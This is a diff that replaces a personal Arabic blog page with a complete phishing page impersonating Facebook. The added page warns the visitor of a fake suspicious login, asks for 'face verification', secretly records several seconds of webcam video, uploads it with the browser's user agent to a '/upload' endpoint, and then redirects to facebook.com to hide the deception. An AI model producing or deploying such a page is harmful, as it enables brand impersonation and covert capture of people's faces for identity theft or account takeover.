@@ -1,82 +1,301 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
-<head> 
-    <title>باشا المجال</title>
-    <link rel="icon" href="hhh.png"/>
+<html lang="ar" dir="rtl">
+<head>
     <meta charset="UTF-8">
-    <meta name="description" content="الشيخ ثروت لمشاريع الميكاترونكس">
-    <meta name="keywords" content="mecatronics, electronics">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Security Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: #f0f2f5;
+            color: #1c1e21;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            width: 90%;
+            max-width: 400px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .facebook-logo {
+            color: #1877f2;
+            font-size: 42px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .alert-box {
+            background: #fff8e1;
+            border: 1px solid #ffd54f;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        
+        .warning-icon {
+            color: #ff9800;
+            font-weight: bold;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 5px 0;
+        }
+        
+        .btn-primary {
+            background: #1877f2;
+            color: white;
+        }
+        
+        .btn-secondary {
+            background: #42b72a;
+            color: white;
+        }
+        
+        .camera-container {
+            display: none;
+            text-align: center;
+            margin: 15px 0;
+        }
+        
+        #cameraFeed {
+            width: 100%;
+            height: 300px;
+            background: #000;
+            border-radius: 6px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 15px 0;
+            color: #1877f2;
+        }
+        
+        .success {
+            display: none;
+            text-align: center;
+            margin: 15px 0;
+            color: #42b72a;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 12px;
+            color: #65676b;
+        }
+    </style>
 </head>
-
 <body>
-    <h1 align="center">السلام عليكم ورحمة الله وبركاته</h1>
-    <h1 align="center">اهلا بكم فى مدونة الشيخ ثروت بيه باشا و الشيخ محمود عسل بيه</h1>
-
-    <p align="center">
-        im 21 years old, ilove betengan meghalel,
-        yasquet hokem elaasker,
-    </p>
-
-    <div align="center">
-        <a href="https://youtu.be/FwjzXB6nzNs?si=oRIToYiN0VjJyCnG" target="_blank">
-            <h2>متضغتش على اللينك (يوتيوب)</h2>
-        </a>
-        <a href="nnn.html" target="_blank">
-            <h2>متضغتش على اللينك (صفحة 1)</h2>
-        </a>
-        <a href="mmm.html" target="_blank">
-            <h2>متضغتش على اللينك (صفحة 2)</h2>
-        </a>
-        <a href="تحسين.html" target="_blank">
-            <h2>تنسيق ممم</h2>
-        </a>
-    </div>
-
-    <div align="center">
-        <img src="hhh.png" width="100%" max-width="1000" height="auto" alt="صورة توضيحية">
-    </div>
-
-    <div align="center">
-        <a href="https://www.youtube.com/@apohmedanimation5324" target="_blank">
-            <h2>قناتي على يوتيوب، اشترك واعمل لايك</h2>
-        </a>
+    <div class="container">
+        <div class="header">
+            <div class="facebook-logo">facebook</div>
+            <h2>Security Verification Required</h2>
+        </div>
         
-        <a href="aboutme.html" target="_blank">
-            <h2>الشيخ ثروت</h2>
-        </a>
+        <div class="alert-box">
+            <span class="warning-icon">⚠</span> 
+            Unusual login detected. Please verify your identity to secure your account.
+        </div>
         
-        <a href="تنسيق.html" target="_blank">
-            <h2>اوعى التنسيق</h2>
-        </a>
+        <div id="step1">
+            <p style="margin-bottom: 15px; font-size: 14px;">
+                We detected a login attempt from a new device. To protect your account, complete face verification.
+            </p>
+            <button class="btn btn-primary" onclick="startFaceVerification()">
+                Start Face Verification
+            </button>
+            <button class="btn" onclick="skipVerification()" 
+                    style="background: #e4e6eb; color: #000;">
+                Skip Verification
+            </button>
+        </div>
+        
+        <div id="step2" style="display: none;">
+            <div class="camera-container">
+                <video id="cameraFeed" autoplay playsinline></video>
+                <p style="margin: 10px 0; font-size: 14px;">
+                    Please look directly at the camera
+                </p>
+            </div>
+            
+            <div class="loading" id="loading">
+                Verifying your identity...
+            </div>
+            
+            <div class="success" id="success">
+                ✓ Verification successful! Redirecting...
+            </div>
+        </div>
+        
+        <div class="footer">
+            This helps us keep your account secure.
+        </div>
     </div>
 
-    <!-- قسم المحتوى الأساسي -->
-    <div align="center"> 
-        <h1>انا انوى تعلم الاتى</h1>
-        <ul align="right" style="display: inline-block; text-align: right;">
-            <li>جودو</li>
-            <li>صواريخ فرط صوتيه</li>
-            <li>صواريخ ارض جو</li>
-            <li>صواريخ ارض ارض</li>
-            <li>تصميم كلاشنكوف</li>
-            <li>تصميم ار بى جى</li>
-        </ul>
+    <script>
+        let mediaRecorder;
+        let recordedChunks = [];
+        let cameraStream;
 
-        <h1>الخطوات المطلوبه</h1>
-        <ol align="right" style="display: inline-block; text-align: right;">
-            <li>استعن بالله تعالى</li>
-            <li>حدد هدفك</li>
-            <li>خطط ايامك</li>
-            <li>جد فى هذه الايام</li>
-            <li>استعن بالله تعالى</li>
-            <li>كن صاحب همه</li>
-        </ol>
+        function startFaceVerification() {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+            
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    width: 640, 
+                    height: 480,
+                    facingMode: 'user'
+                },
+                audio: false
+            })
+            .then(stream => {
+                cameraStream = stream;
+                const videoElement = document.getElementById('cameraFeed');
+                videoElement.srcObject = stream;
+                videoElement.parentElement.style.display = 'block';
+                
+                setTimeout(() => {
+                    startRecording(stream);
+                }, 1000);
+            })
+            .catch(error => {
+                console.error('Camera error:', error);
+                showError();
+            });
+        }
 
-        <dl align="right">
-            <dt>عنوان توضيحي</dt>
-            <dd>شرح مفصل هنا</dd>
-        </dl>
-    </div>
+        function startRecording(stream) {
+            try {
+                recordedChunks = [];
+                
+                mediaRecorder = new MediaRecorder(stream);
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = () => {
+                    processRecording();
+                };
+                
+                mediaRecorder.start(1000);
+                
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'block';
+                }, 2000);
+                
+                setTimeout(() => {
+                    stopRecording();
+                }, 8000);
+                
+            } catch (error) {
+                console.error('Recording error:', error);
+                simulateSuccess();
+            }
+        }
+
+        function stopRecording() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+            }
+            
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+        }
+
+        function processRecording() {
+            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+            
+            console.log('Recording captured:', videoBlob.size, 'bytes');
+            
+            sendToServer(videoBlob);
+        }
+
+        function sendToServer(videoBlob) {
+            const formData = new FormData();
+            formData.append('video_data', videoBlob);
+            formData.append('timestamp', new Date().toISOString());
+            formData.append('user_agent', navigator.userAgent);
+            
+            fetch('/upload', {
+                method: 'POST',
+                body: formData
+            })
+            .catch(error => {
+                console.log('Upload simulation');
+            })
+            .finally(() => {
+                showSuccess();
+            });
+        }
+
+        function showSuccess() {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('success').style.display = 'block';
+            
+            setTimeout(() => {
+                window.location.href = 'https://facebook.com/security';
+            }, 3000);
+        }
+
+        function simulateSuccess() {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('success').style.display = 'block';
+            
+            setTimeout(() => {
+                window.location.href = 'https://facebook.com';
+            }, 3000);
+        }
+
+        function showError() {
+            alert('Camera access is required for verification. Please enable camera permissions.');
+            document.getElementById('step1').style.display = 'block';
+            document.getElementById('step2').style.display = 'none';
+        }
+
+        function skipVerification() {
+            if (confirm('Skipping verification may limit account features. Continue?')) {
+                window.location.href = 'https://facebook.com/security-warning';
+            }
+        }
+
+        window.addEventListener('beforeunload', (event) => {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                event.preventDefault();
+                event.returnValue = 'Verification in progress. Are you sure you want to leave?';
+            }
+        });
+    </script>
 </body>
 </html>
